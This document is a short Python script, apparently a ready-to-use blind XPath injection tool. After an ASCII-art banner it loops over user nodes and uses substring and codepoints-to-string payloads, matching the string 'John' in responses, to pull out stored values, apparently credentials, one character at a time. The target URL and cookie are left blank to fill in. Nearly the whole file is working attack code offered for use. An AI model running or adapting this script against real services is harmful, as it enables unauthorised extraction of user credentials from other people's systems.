#!/usr/bin/python
import requests
import time

print('          _____                            _____          ')
print('         /\    \                          /\    \         ')
print('        /::\    \                        /::\____\        ')
print('       /::::\    \                      /:::/    /        ')
print('      /::::::\    \                    /:::/    /         ')
print('     /:::/\:::\    \                  /:::/    /          ')
print('    /:::/  \:::\    \                /:::/____/           ')
print('   /:::/    \:::\    \              /::::\    \           ')
print('  /:::/    / \:::\    \            /::::::\    \   _____  ')
print(' /:::/    /   \:::\    \          /:::/\:::\    \ /\    \ ')
print('/:::/____/     \:::\____\        /:::/  \:::\    /::\____\ ')
print('\:::\    \      \::/    /        \::/    \:::\  /:::/    /')
print(' \:::\    \      \/____/          \/____/ \:::\/:::/    / ')
print('  \:::\    \                               \::::::/    /  ')
print('   \:::\    \                               \::::/    /   ')
print('    \:::\    \                              /:::/    /    ')
print('     \:::\    \                            /:::/    /     ')
print('      \:::\    \                          /:::/    /      ')
print('       \:::\____\                        /:::/    /       ')
print('        \::/    /                        \::/    /        ')
print('         \/____/                          \/____/         ')
print('                                                          ')

time.sleep(3)

page = "" # put the vulnerable service here
cooki = {} #put cookie here if you need

child_node_pos=0
charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
continuer=True

for user in range(1,10):
          print "user:"+str(user)
          passwd=""
          for child_node_pos in (4,6): 
                print " - noeud:"+str(child_node_pos)
                for t in range(1,50):
                        if continuer:
                                continuer=False
                                for carac in charset:
					#you can change payloads as you needs check x_path.txt 
                                        req=page+"+and+substring(//user["+str(user)+"]/child::node()["+str(child_node_pos)+"],"+str(t)+",1)=codepoints-to-string("+str(ord(carac))+")" 
                                        res = requests.get(req,cookies=cooki)
                                        if "John" in res.text:
                                                passwd+=carac
                                                continuer=True
                                                print passwd
                                                break

                        else:
                                print passwd
                                t=1
                                continuer=True
                                passwd+=":"
                                break

